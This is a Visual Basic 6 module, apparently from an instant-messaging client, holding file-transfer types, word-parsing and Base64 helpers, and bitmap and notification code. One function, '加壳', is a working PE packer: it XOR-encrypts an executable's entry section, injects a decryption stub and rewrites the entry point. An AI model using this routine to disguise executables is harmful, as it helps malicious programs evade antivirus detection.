Attribute VB_Name = "IM部分"
Public RTChatRemoteIP As String
Public RTChatRemoteNick As String
Public RTCListen As Boolean
Public FileSendRemoteIP As String
Public FileSendRemoteNick As String
Public RemoteNick As String
Public gFileNum As Long
Public RTChatTemp As String
Public BuddyStatus As String
Public MYSTATUS As Long
Public GETMSGCOUNT As Long

Private Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Long, ByVal hWndInsertAfter As Long, ByVal X As Long, ByVal Y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long) As Long
Private Const SWP_NOMOVE         As Long = 2
Private Const SWP_NOSIZE         As Long = 1
Private Const flags              As Long = SWP_NOMOVE Or SWP_NOSIZE
Private Const HWND_TOPMOST       As Long = -1
Private Const HWND_NOTOPMOST     As Long = -2
Public g_NotificationRequests   As Collection


Global Const CANCEL_TRANSFER As String = "1"
Global Const ACCEPT_TRANSFER As String = "2"
Global Const BEGIN_TRANSFER As String = "3"
Global Const END_TRANSFER As String = "4"
Global Const FILE_NAME As String = "5"
Global Const FILE_SIZE As String = "6"
Global Const USER_NAME As String = "7"
Global Const CONTINUE_TRANSFER As String = "8"
Global Const CLOSE_TRANSFER As String = "9"
Global Const ENABLE_START As String = "3"
Public MyPersonalInfo As MyPersonalData
Public DefCOM As Integer
Public Type MyPersonalData
    Sex As String * 7
    COU As String * 100
    Country As String * 201
    BIRTHDAY As String * 11
    BIRTH As String * 11
    Age As Integer
    PHONE As String * 101
    TEL As String * 101
    QQ As String * 101
    Address As String * 101
    language As String * 100
    STUDY As String * 100
    JOB As String * 100
    SX As String * 100
    OAB As String * 100
    Webpage As String * 101
    About As String * 451
End Type
Public Type T_FILE_TRANSFER_SEND
  Comment         As String * 200 'The Comment Of The File
  To              As String       'IP/Host to send file
  FileToSend      As String       'The File Were Sending
  FileSize        As Double       'The Size Of The File
  frmChoose       As New frmFileChoose
  frmSend         As New FRMSENDING
End Type

Public Type T_FILE_TRANSFER_RECEIVE
  Comment         As String * 200 'The Comment Of The File
  Destination     As String       'Save File To Here
  From            As String       'IP/Host of sending person
  FileSize        As Double       'The Size Of The File
  filename        As String
  frmRcOpt        As New frmReceiveOpt
  frmReceive      As New frmReceiving
End Type
Private Const cstBase64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
Private arrBase64() As String
Public Const FT_BUFFER_SIZE = 5734  'CHANGE THIS IF YOU NEED TO
Public Const FT_USE_PORT = 361      'CHANGE THIS IF YOU NEED TO
Public Type SectionHeader
    name As String * 8
    RVA As Long
    VirtualSize As Long
    PhysicalSize As Long
    offset As Long
    flags As Long
End Type
Public ftSend()       As T_FILE_TRANSFER_SEND
Dim SendCount         As Long
Public ftRcv()        As T_FILE_TRANSFER_RECEIVE
Dim RcvCount          As Long
Public Const NeededArea As Long = 30
Public pe() As Byte, e_lfanew As Long, NumberOfSections As Long, SizeOfOptionalHeader As Long, AddressOfEntryPoint As Long, NumberOfRvaAndSizes As Long
Public EncStart As Long, EncEnd As Long, SectionTableOffset As Long, SectionTable() As SectionHeader, EntrySection As Long, PaddingArea As Long, TMP As Long
Public PatchCode(NeededArea - 1) As Byte
Private Type PictDesc
    cbSizeofStruct As Long
    PicType As Long
    hImage As Long
    xExt As Long
    yExt As Long
End Type

Private Type GUID
    Data1 As Long
    data2 As Integer
    Data3 As Integer
    Data4(0 To 7) As Byte
End Type

Private Type BITMAPINFOHEADER
    biSize As Long
    biWidth As Long
    biHeight As Long
    biPlanes As Integer
    biBitCount As Integer
    biCompression As Long
    biSizeImage As Long
    biXPelsPerMeter As Long
    biYPelsPerMeter As Long
    biClrUsed As Long
    biClrImportant As Long
End Type

Private Type BITMAPINFO
    bmiHeader As BITMAPINFOHEADER
    bmiColors(255) As Long
End Type

Private Type RECT
    Left As Long
    Top As Long
    Right As Long
    Bottom As Long
End Type

Private Declare Function StretchDIBits Lib "gdi32.dll" (ByVal hdc As Long, ByVal X As Long, ByVal Y As Long, ByVal dX As Long, ByVal dY As Long, ByVal SrcX As Long, ByVal SrcY As Long, ByVal wSrcWidth As Long, ByVal wSrcHeight As Long, ByRef lpBits As Any, ByRef lpBitsInfo As BITMAPINFO, ByVal wUsage As Long, ByVal dwRop As Long) As Long
Private Declare Function CreateSolidBrush Lib "gdi32.dll" (ByVal crColor As Long) As Long
Private Declare Function FillRect Lib "user32.dll" (ByVal hdc As Long, ByRef lpRect As RECT, ByVal hBrush As Long) As Long
Private Declare Function GetDC Lib "user32.dll" (ByVal hwnd As Long) As Long
Private Declare Function CreateCompatibleDC Lib "gdi32.dll" (ByVal hdc As Long) As Long
Private Declare Function CreateCompatibleBitmap Lib "gdi32.dll" (ByVal hdc As Long, ByVal nWidth As Long, ByVal nHeight As Long) As Long
Private Declare Function SelectObject Lib "gdi32.dll" (ByVal hdc As Long, ByVal hObject As Long) As Long
Private Declare Function DeleteObject Lib "gdi32.dll" (ByVal hObject As Long) As Long
Private Declare Function DeleteDC Lib "gdi32.dll" (ByVal hdc As Long) As Long
Private Declare Function ReleaseDC Lib "user32.dll" (ByVal hwnd As Long, ByVal hdc As Long) As Long
Private Declare Function OleCreatePictureIndirect Lib "OLEPRO32.DLL" (lpPictDesc As PictDesc, riid As GUID, ByVal fPictureOwnsHandle As Long, ipic As IUnknown) As Long


Public Function SendFile(ByVal Destination As String)
  ReDim Preserve ftSend(0 To SendCount)
  
  ftSend(SendCount).To = Destination
  ftSend(SendCount).frmChoose.ChooseSend SendCount
  SendCount = SendCount + 1
End Function

Public Function ConnectReq(ByVal requestID As Long)
  ReDim Preserve ftRcv(0 To RcvCount)
  
  ftRcv(RcvCount).frmReceive.Prepare RcvCount, requestID
  RcvCount = RcvCount + 1
End Function

Public Function Word(ByVal sSource As String, n As Long) As String
Const SP    As String = " "
Dim Pointer As Long   'start parameter of Instr()
Dim pos     As Long   'position of target in InStr()
Dim X       As Long   'word count
Dim lEnd    As Long   'position of trailing word delimiter

sSource = CSpace(sSource)

'find the nth word
X = 1
Pointer = 1

Do
   Do While Mid$(sSource, Pointer, 1) = SP     'skip consecutive spaces
      Pointer = Pointer + 1
   Loop
   If X = n Then                               'the target word-number
      lEnd = InStr(Pointer, sSource, SP)       'pos of space at end of word
      If lEnd = 0 Then lEnd = Len(sSource) + 1 '   or if its the last word
      Word = Mid$(sSource, Pointer, lEnd - Pointer)
      Exit Do                                  'word found, done
   End If
  
   pos = InStr(Pointer, sSource, SP)           'find next space
   If pos = 0 Then Exit Do                     'word not found
   X = X + 1                                   'increment word counter
  
   Pointer = pos + 1                           'start of next word
Loop
  
End Function

Public Function Words(ByVal sSource As String) As Long
Const SP    As String = " "
Dim lSource As Long    'length of sSource
Dim Pointer As Long    'start parameter of Instr()
Dim pos     As Long    'position of target in InStr()
Dim X       As Long    'word count

sSource = CSpace(sSource)
lSource = Len(sSource)
If lSource = 0 Then Exit Function

'count words
X = 1
Pointer = 1

Do
   Do While Mid$(sSource, Pointer, 1) = SP     'skip consecutive spaces
      Pointer = Pointer + 1
   Loop
   pos = InStr(Pointer, sSource, SP)           'find next space
   If pos = 0 Then Exit Do                     'no more words
   X = X + 1                                   'increment word counter
  
   Pointer = pos + 1                           'start of next word
Loop
If Mid$(sSource, lSource, 1) = SP Then X = X - 1 'adjust if trailing space
Words = X
End Function

Public Function WordCount(ByVal sSource As String, STarget As String) As Long
Const SP    As String = " "
Dim Pointer As Long    'start parameter of Instr()
Dim lSource As Long    'length of sSource
Dim lTarget As Long    'length of sTarget
Dim pos     As Long    'position of target in InStr()
Dim X       As Long    'word count

lTarget = Len(STarget)
lSource = Len(sSource)
sSource = CSpace(sSource)


'find target word
Pointer = 1
Do While Mid$(sSource, Pointer, 1) = SP       'skip consecutive spaces
   Pointer = Pointer + 1
Loop
If Pointer > lSource Then Exit Function       'sSource contains no words

Do                                            'find position of sTarget
   pos = InStr(Pointer, sSource, STarget)
   If pos = 0 Then Exit Do                    'string not found
   If Mid$(sSource, pos + lTarget, 1) = SP _
   Or pos + lTarget > lSource Then            'must be a word
      If pos = 1 Then
         X = X + 1                            'word found
      ElseIf Mid$(sSource, pos - 1, 1) = SP Then
         X = X + 1                            'word found
      End If
   End If
   Pointer = pos + lTarget
Loop
WordCount = X

End Function

Public Function WordPos(ByVal sSource As String, STarget As String) As Long
Const SP       As String = " "
Dim Pointer    As Long    'start parameter of Instr()
Dim lSource    As Long    'length of sSource
Dim lTarget    As Long    'length of sTarget
Dim lPosTarget As Long    'position of target-word
Dim pos        As Long    'position of target in InStr()
Dim X          As Long    'word count

lTarget = Len(STarget)
lSource = Len(sSource)
sSource = CSpace(sSource)


'find target word
Pointer = 1
Do While Mid$(sSource, Pointer, 1) = SP       'skip consecutive spaces
   Pointer = Pointer + 1
Loop
If Pointer > lSource Then Exit Function       'sSource contains no words

Do                                            'find position of sTarget
   pos = InStr(Pointer, sSource, STarget)
   If pos = 0 Then Exit Function              'string not found
   If Mid$(sSource, pos + lTarget, 1) = SP _
   Or pos + lTarget > lSource Then            'must be a word
      If pos = 1 Then Exit Do                 'word found
      If Mid$(sSource, pos - 1, 1) = SP Then Exit Do
   End If
   Pointer = pos + lTarget
Loop


'count words until position of sTarget
lPosTarget = pos                             'save position of sTarget
Pointer = 1
X = 1
Do
   Do While Mid$(sSource, Pointer, 1) = SP   'skip consecutive spaces
      Pointer = Pointer + 1
   Loop
   If Pointer >= lPosTarget Then Exit Do     'all words have been counted
   pos = InStr(Pointer, sSource, SP)         'find next space
   If pos = 0 Then Exit Do                   'no more words
   X = X + 1                                 'increment word count
   Pointer = pos + 1                         'start of next word
Loop
WordPos = X
End Function

Public Function DelWord(ByVal sSource As String, _
                                    n As Long, _
                      Optional vWords As Variant) As String
Const SP    As String = " "
Dim lWords  As Long    'length of sTarget
Dim lSource As Long    'length of sSource
Dim Pointer As Long    'start parameter of InStr()
Dim pos     As Long    'position of target in InStr()
Dim X       As Long    'word counter
Dim lStart  As Long    'position of word n
Dim lEnd    As Long    'position of space after last word

lSource = Len(sSource)
DelWord = sSource
sSource = CSpace(sSource)
If IsMissing(vWords) Then
   lWords = -1
ElseIf IsNumeric(vWords) Then
   lWords = CLng(vWords)
Else
   Exit Function
End If

If n = 0 Or lWords = 0 Then Exit Function      'nothing to delete

'find position of n
X = 1
Pointer = 1

Do
   Do While Mid$(sSource, Pointer, 1) = SP     'skip consecutive spaces
      Pointer = Pointer + 1
   Loop
   If X = n Then                               'the target word-number
      lStart = Pointer
      If lWords < 0 Then Exit Do
   End If
   
   If lWords > 0 Then                          'lWords was provided
      If X = n + lWords - 1 Then               'find pos of last word
         lEnd = InStr(Pointer, sSource, SP)    'pos of space at end of word
         Exit Do                               'word found, done
      End If
   End If
   
   pos = InStr(Pointer, sSource, SP)           'find next space
   If pos = 0 Then Exit Do                     'word not found
   X = X + 1                                   'increment word counter
  
   Pointer = pos + 1                           'start of next word
Loop
If lStart = 0 Then Exit Function
If lEnd = 0 Then
   DelWord = Trim$(Left$(sSource, lStart - 1))
Else
   DelWord = Trim$(Left$(sSource, lStart - 1) & Mid$(sSource, lEnd + 1))
End If
End Function

Public Function MidWord(ByVal sSource As String, _
                                    n As Long, _
                      Optional vWords As Variant) As String
Const SP    As String = " "
Dim lWords  As Long    'vWords converted to long
Dim lSource As Long    'length of sSource
Dim Pointer As Long    'start parameter of InStr()
Dim pos     As Long    'position of target in InStr()
Dim X       As Long    'word counter
Dim lStart  As Long    'position of word n
Dim lEnd    As Long    'position of space after last word

lSource = Len(sSource)
sSource = CSpace(sSource)
If IsMissing(vWords) Then
   lWords = -1
ElseIf IsNumeric(vWords) Then
   lWords = CLng(vWords)
Else
   Exit Function
End If

If n = 0 Or lWords = 0 Then Exit Function              'nothing to delete

'find position of n
X = 1
Pointer = 1

Do
   Do While Mid$(sSource, Pointer, 1) = SP     'skip consecutive spaces
      Pointer = Pointer + 1
   Loop
   If X = n Then                               'the target word-number
      lStart = Pointer
      If lWords < 0 Then Exit Do               'include rest of sSource
   End If
   
   If lWords > 0 Then                          'lWords was provided
      If X = n + lWords - 1 Then               'find pos of last word
         lEnd = InStr(Pointer, sSource, SP)    'pos of space at end of word
         Exit Do                               'word found, done
      End If
   End If
   
   pos = InStr(Pointer, sSource, SP)           'find next space
   If pos = 0 Then Exit Do                     'word not found
   X = X + 1                                   'increment word counter
  
   Pointer = pos + 1                           'start of next word
Loop
If lStart = 0 Then Exit Function
If lEnd = 0 Then
   MidWord = Trim$(Mid$(sSource, lStart))
Else
   MidWord = Trim$(Mid$(sSource, lStart, lEnd - lStart))
End If
End Function

Public Function CSpace(sSource As String) As String
Dim Pointer   As Long
Dim pos       As Long
Dim X         As Long
Dim iSpace(3) As Integer

' define blank characters
iSpace(0) = 9    'Horizontal Tab
iSpace(1) = 10   'Line Feed
iSpace(2) = 13   'Carriage Return
iSpace(3) = 160  'Hard Space

CSpace = sSource
For X = 0 To UBound(iSpace) ' replace all blank characters with space
   Pointer = 1
   Do
      pos = InStr(Pointer, CSpace, Chr$(iSpace(X)))
      If pos = 0 Then Exit Do
      Mid$(CSpace, pos, 1) = " "
      Pointer = pos + 1
   Loop
Next X

End Function

Public Function SplitString(iSource As String, iTarget As String, Optional BeforeTarget As Boolean = False) As String
If BeforeTarget = True Then
   SplitString = DelWord(iSource, WordPos(iSource, iTarget))
Else
   SplitString = DelWord(iSource, 1, WordPos(iSource, iTarget))
End If

End Function
Public Function 加壳(ByVal a As String, ByVal b As String) As String
    PatchCode(0) = &H60: PatchCode(1) = &HE8: PatchCode(6) = &H5B: PatchCode(7) = &HB8: PatchCode(12) = &H80: PatchCode(13) = &H34: PatchCode(14) = &H3
    PatchCode(15) = &HB8: PatchCode(16) = &H40: PatchCode(17) = &H3D: PatchCode(22) = &H75: PatchCode(23) = &HF4: PatchCode(24) = &H61: PatchCode(25) = &HE9
    Dim i As Long, p As Long, Q As Long
    On Error GoTo HasError
    Close #1
    ReDim pe(FileLen(a) - 1)
    Open a For Binary As #1
    Get #1, , pe
    Close #1
    If ReadWord(0) <> &H5A4D& Then GoTo NotPE
    e_lfanew = ReadDword(&H3C&)
    If ReadDword(e_lfanew) <> &H4550& Then GoTo NotPE
    If ReadWord(e_lfanew + 4) <> &H14C& Then GoTo NotPE
    NumberOfSections = ReadWord(e_lfanew + 6)
    If NumberOfSections <= 0& Or NumberOfSections >= &H100& Then GoTo NotPE
    SizeOfOptionalHeader = ReadWord(e_lfanew + &H14&)
    If ReadWord(e_lfanew + &H18&) <> &H10B& Then GoTo NotPE
    AddressOfEntryPoint = ReadWord(e_lfanew + &H28&)
    If SizeOfOptionalHeader >= &H60& Then
        NumberOfRvaAndSizes = ReadDword(e_lfanew + &H74&)
    Else
        NumberOfRvaAndSizes = 0
    End If
    If NumberOfRvaAndSizes > 16 Then NumberOfRvaAndSizes = 16
    If NumberOfRvaAndSizes > (SizeOfOptionalHeader - &H60&) \ 8 Then NumberOfRvaAndSizes = (SizeOfOptionalHeader - &H60&) \ 8
    NumberOfRvaAndSizes = NumberOfRvaAndSizes - 1
    EncStart = 0: EncEnd = &H7FFFFFFF
    For i = 0 To NumberOfRvaAndSizes
        p = ReadDword(e_lfanew + &H78& + i * 8)
        Q = p + ReadDword(e_lfanew + &H7C& + i * 8)
        If p < 0 Or p > Q Then
            Exit Function
        ElseIf p < AddressOfEntryPoint And Q < AddressOfEntryPoint Then
            If Q >= EncStart Then EncStart = Q + 1
        ElseIf p > AddressOfEntryPoint And Q > AddressOfEntryPoint Then
            If p <= EncEnd Then EncEnd = p - 1
        Else
            Exit Function
        End If
    Next
    NumberOfSections = NumberOfSections - 1
    If SizeOfOptionalHeader <> 224 Then Stop
    SectionTableOffset = e_lfanew + &H18& + SizeOfOptionalHeader
    EntrySection = -1
    ReDim SectionTable(NumberOfSections)
SectionTableAnalysis:

    For i = 0 To NumberOfSections
        With SectionTable(i)
            .name = Read8Str(SectionTableOffset + i * &H28&)
            .VirtualSize = ReadDword(SectionTableOffset + i * &H28& + &H8&)
            .RVA = ReadDword(SectionTableOffset + i * &H28& + &HC&)
            .PhysicalSize = ReadDword(SectionTableOffset + i * &H28& + &H10&)
            .offset = ReadDword(SectionTableOffset + i * &H28& + &H14&)
            .flags = ReadDword(SectionTableOffset + i * &H28& + &H24&)
            If EntrySection = -1 Then
                If (AddressOfEntryPoint >= .RVA) And (AddressOfEntryPoint <= .RVA + .VirtualSize) Then EntrySection = i
            End If
        End With
    Next
    
    If EntrySection = -1 Then

        Exit Function
    End If
    With SectionTable(EntrySection)
        If Trim(.name) = "" Then

        Else

        End If

        PaddingArea = .PhysicalSize - .VirtualSize

        If PaddingArea < NeededArea Then
              .VirtualSize = .PhysicalSize - NeededArea
            If .VirtualSize < 0 Then
    
                Exit Function
            End If
            WriteDword SectionTableOffset + EntrySection * &H28& + 8, .VirtualSize
        
            GoTo SectionTableAnalysis
        End If
        For i = .offset + .VirtualSize To .offset + .PhysicalSize - 1
            If pe(i) <> 0 Then Exit For
        Next
        If .RVA > EncStart Then EncStart = .RVA
        If .RVA + .VirtualSize - 1 < EncEnd Then EncEnd = .RVA + .VirtualSize - 1
        For i = EncStart - .RVA + .offset To EncEnd - .RVA + .offset
            pe(i) = pe(i) Xor &HB8
        Next
        TMP = EncStart - (.RVA + .VirtualSize + 6)
        CopyMemory PatchCode(8), TMP, 4
        TMP = (EncEnd + 1) - (.RVA + .VirtualSize + 6)
        CopyMemory PatchCode(18), TMP, 4
        TMP = AddressOfEntryPoint - (.RVA + .VirtualSize + 30)
        CopyMemory PatchCode(26), TMP, 4
        CopyMemory pe(.offset + .VirtualSize), PatchCode(0), NeededArea
        AddressOfEntryPoint = .RVA + .VirtualSize
        WriteDword e_lfanew + &H28&, AddressOfEntryPoint
        .VirtualSize = .VirtualSize + NeededArea
        WriteDword SectionTableOffset + EntrySection * &H28& + &H8&, .VirtualSize
        .flags = .flags Or &H80000000
        WriteDword SectionTableOffset + EntrySection * &H28& + &H24&, .flags
    End With
    Open b For Binary As #1
    Put #1, , pe
    Close #1
    Exit Function
NotPE:
    Exit Function
HasError:
End Function

Public Function ReadWord(ByVal offset As Long) As Long
    CopyMemory ReadWord, pe(offset), 2
End Function

Public Function ReadDword(ByVal offset As Long) As Long
    CopyMemory ReadDword, pe(offset), 4
End Function

Public Sub WriteDword(ByVal offset As Long, ByVal Data As Long)
    CopyMemory pe(offset), Data, 4
End Sub

Public Function Add0To8(ByVal InputStr As String) As String
    Add0To8 = String(8 - Len(InputStr), "0") & InputStr
End Function

Public Function Read8Str(ByVal offset As Long) As String
    Dim i As Long, C As Byte, s As String
    For i = 0 To 7
         C = pe(offset + i)
         If C < 32 Or C > 127 Then C = 32
         s = s & Chr(C)
    Next
    Read8Str = s
End Function


Public Function BitmapToPicture(ByVal hBmp As Long, ByVal fPictureOwnsHandle As Long) As StdPicture

    If (hBmp = 0) Then Exit Function
   
    Dim oNewPic As IUnknown, tPicConv As PictDesc, IGuid As GUID
   
    ' Fill PictDesc structure with necessary parts:
    With tPicConv
        .cbSizeofStruct = Len(tPicConv)
        .PicType = vbPicTypeBitmap
        .hImage = hBmp
    End With
   
    ' Fill in IUnknown Interface ID
    With IGuid
        .Data4(0) = &HC0
        .Data4(7) = &H46
    End With
   
    ' Create a picture object:
    OleCreatePictureIndirect tPicConv, IGuid, fPictureOwnsHandle, oNewPic
   
    ' Return it:
    Set BitmapToPicture = oNewPic
   
End Function

'color depth: 8 bits, 0=white, all other=black
'width must be a multiple of 4
Public Function ByteArrayToPicture(ByVal LP As Long, ByVal nWidth As Long, ByVal nHeight As Long, Optional ByVal nLeftPadding As Long, Optional ByVal nTopPadding As Long, Optional ByVal nRightPadding As Long, Optional ByVal nBottomPadding As Long) As StdPicture
Dim tBmi As BITMAPINFO
Dim H As Long, hdc As Long, hBmp As Long
Dim hBr As Long
Dim r As RECT
'///
With tBmi.bmiHeader
 .biSize = 40&
 .biWidth = nWidth
 .biHeight = -nHeight
 .biPlanes = 1
 .biBitCount = 8
 .biSizeImage = nWidth * nHeight
 .biClrUsed = 256
End With
tBmi.bmiColors(0) = &HFFFFFF
tBmi.bmiColors(2) = &H808080 'debug only
'///
H = GetDC(0)
hdc = CreateCompatibleDC(H)
r.Right = nWidth + nLeftPadding + nRightPadding
r.Bottom = nHeight + nTopPadding + nBottomPadding
hBmp = CreateCompatibleBitmap(H, r.Right, r.Bottom)
hBmp = SelectObject(hdc, hBmp)
'///
hBr = CreateSolidBrush(vbWhite)
FillRect hdc, r, hBr
DeleteObject hBr
StretchDIBits hdc, nLeftPadding, nTopPadding, nWidth, nHeight, 0, 0, nWidth, nHeight, ByVal LP, tBmi, 0, vbSrcCopy
'///
hBmp = SelectObject(hdc, hBmp)
DeleteDC hdc
ReleaseDC 0, H
'///
Set ByteArrayToPicture = BitmapToPicture(hBmp, 1)
End Function
Public Function VailText(KeyIn As Integer, ValidateString As String, Editable As Boolean) As Integer
    Dim Validatelist     As String
    Dim KeyOut           As Integer
    If Editable = True Then
      Validatelist = UCase$(ValidateString) & Chr(vbKeyBack)
    Else
      Validatelist = UCase$(ValidateString)
    End If
    If InStr(1, Validatelist, UCase$(Chr(KeyIn)), 1) > 0 Then
      KeyOut = KeyIn
    Else
      KeyOut = 0
      Beep
    End If
    VailText = KeyOut
End Function
Public Function Base64Encode(strSource As String) As String '加密
On Error Resume Next

If UBound(arrBase64) = -1 Then
    arrBase64 = Split(StrConv(cstBase64, vbUnicode), vbNullChar)
End If
Dim arrB() As Byte, bTmp(2)  As Byte, bt As Byte
Dim i As Long, j As Long
arrB = StrConv(strSource, vbFromUnicode)

j = UBound(arrB)
For i = 0 To j Step 3
    Erase bTmp
    bTmp(0) = arrB(i + 0)
    bTmp(1) = arrB(i + 1)
    bTmp(2) = arrB(i + 2)
    
    bt = (bTmp(0) And 252) / 4
    Base64Encode = Base64Encode & arrBase64(bt)
    
    bt = (bTmp(0) And 3) * 16
    bt = bt + bTmp(1) \ 16
    Base64Encode = Base64Encode & arrBase64(bt)
    
    bt = (bTmp(1) And 15) * 4
    bt = bt + bTmp(2) \ 64
    If i + 1 <= j Then
        Base64Encode = Base64Encode & arrBase64(bt)
    Else
        Base64Encode = Base64Encode & "="
    End If
    
    bt = bTmp(2) And 63
    If i + 2 <= j Then
        Base64Encode = Base64Encode & arrBase64(bt)
    Else
        Base64Encode = Base64Encode & "="
    End If
Next
End Function

Public Function Base64Decode(strEncoded As String) As String '解密

On Error Resume Next
Dim arrB() As Byte, bTmp(3)  As Byte, bt, bRet() As Byte
Dim i As Long, j As Long
arrB = StrConv(strEncoded, vbFromUnicode)
j = InStr(strEncoded & "=", "=") - 2
ReDim bRet(j - j \ 4 - 1)
For i = 0 To j Step 4
    Erase bTmp
    bTmp(0) = (InStr(cstBase64, Chr(arrB(i))) - 1) And 63
    bTmp(1) = (InStr(cstBase64, Chr(arrB(i + 1))) - 1) And 63
    bTmp(2) = (InStr(cstBase64, Chr(arrB(i + 2))) - 1) And 63
    bTmp(3) = (InStr(cstBase64, Chr(arrB(i + 3))) - 1) And 63
    
    bt = bTmp(0) * 2 ^ 18 + bTmp(1) * 2 ^ 12 + bTmp(2) * 2 ^ 6 + bTmp(3)
    
    bRet((i \ 4) * 3) = bt \ 65536
    bRet((i \ 4) * 3 + 1) = (bt And 65280) \ 256
    bRet((i \ 4) * 3 + 2) = bt And 255
Next
Base64Decode = StrConv(bRet, vbUnicode)
End Function


Public Function GetaLine(Text1 As TextBox, ByVal ntx As Long) As String
    '如果字串大于 255 byte，需增加该Byte Array.
    Dim str5(255) As Byte
    Dim str6 As String, i As Long
    '字串的前两个Byte存该字串的最大长度.
    str5(0) = 255
    str5(0) = 255
    '取出文字.
    i = SendMessage(Text1.hwnd, EM_GETLINE, ntx, str5(0))
    If i = 0 Then
        GetaLine = ""
    Else
        str6 = StrConv(str5, vbUnicode)
        GetaLine = Left(str6, InStr(1, str6, Chr(0)) - 1)
    End If
 End Function
Public Sub RequestUserNotification(ByRef Key As String, ByRef Title As String, ByRef Description As String, ByRef AllowSameType As Boolean)
Dim lNotificationRequest        As cNotificationRequest
Dim lItemKey                    As String
Dim lAddToCollectionRequired    As Boolean
On Error Resume Next

    Set lNotificationRequest = New cNotificationRequest
    With lNotificationRequest
        .Key = Key
        .Title = Title
        .Description = Description
    End With
    
    lAddToCollectionRequired = True
    
    If (Not FRMDOWN.m_NotificationWindow Is Nothing) And (Not AllowSameType) Then
        If (FRMDOWN.m_NotificationWindow.NotificationRequest.Title = Title) Then
            Call FRMDOWN.m_NotificationWindow.UpdateNotification(lNotificationRequest)
            lAddToCollectionRequired = False
        End If
    End If
        
    If (lAddToCollectionRequired) Then
        ' Build the Request Key.
        lItemKey = IIf(Not AllowSameType, Title, Description)
        ' Remove Duplicates and Add the UserPopup Request to the Collection.
        Call RemoveDuplicateRequest(lItemKey)
        g_NotificationRequests.Add lNotificationRequest, lItemKey
    End If
End Sub

Private Sub RemoveDuplicateRequest(ByRef Key As String)
On Error Resume Next
    ' Request a remove of an item with the same key.
    g_NotificationRequests.REMOVE Key
End Sub

Public Sub SetWindowTopMost(ByRef handle As Long)
On Error Resume Next
    ' Set the window to be top most.
    Call SetWindowPos(handle, HWND_TOPMOST, 0, 0, 0, 0, flags)
End Sub

